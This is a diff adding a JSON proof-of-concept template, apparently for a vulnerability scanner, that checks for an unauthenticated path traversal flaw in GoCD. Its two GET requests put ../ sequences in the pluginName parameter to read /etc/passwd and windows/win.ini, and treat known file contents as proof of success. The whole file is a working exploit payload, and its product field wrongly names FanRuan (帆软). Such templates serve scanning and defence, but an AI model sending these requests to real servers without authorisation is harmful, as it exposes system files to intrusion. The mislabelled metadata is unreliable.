@@ -1,0 +1,56 @@
+{
+    "Name": "GoCD_未授权路径穿越漏洞",
+    "Description": "GoCD_未授权路径穿越漏洞",
+    "Product": "帆软",
+    "author": "chumeng",
+    "Request":[
+        {
+        "Method": "GET",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
+        "Uri":"/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../../../etc/passwd",
+        "Port":"",
+        "Data":"",
+        "Follow_redirects":"false",
+        "Upload":{"Name": "","fileName": "","filePath": "" },
+        "Response":{
+        "Check_Steps":"AND",
+        "Checks": [
+                {
+                "Operation": "contains", 
+                "Key":"",
+                "Value": "root:x:0:0:root"
+                },
+                 {
+                "Operation": "code", 
+                "Key":"",
+                "Value": "200"  
+                 }
+        ]
+        },
+        "Next_decide":"OR"
+                },{
+                    "Method": "GET",
+                    "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
+                    "Uri":"/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../../../windows/win.ini",
+                    "Port":"",
+                    "Data":"",
+                    "Follow_redirects":"false",
+                    "Upload":{"Name": "","fileName": "","filePath": "" },
+                    "Response":{
+                    "Check_Steps":"AND",
+                    "Checks": [
+                            {
+                            "Operation": "contains", 
+                            "Key":"",
+                            "Value": "for 16-bit app support"
+                            },
+                             {
+                            "Operation": "code", 
+                            "Key":"",
+                            "Value": "200"  
+                             }
+                    ]
+                    },
+                    "Next_decide":"OR"
+                            }
+]}
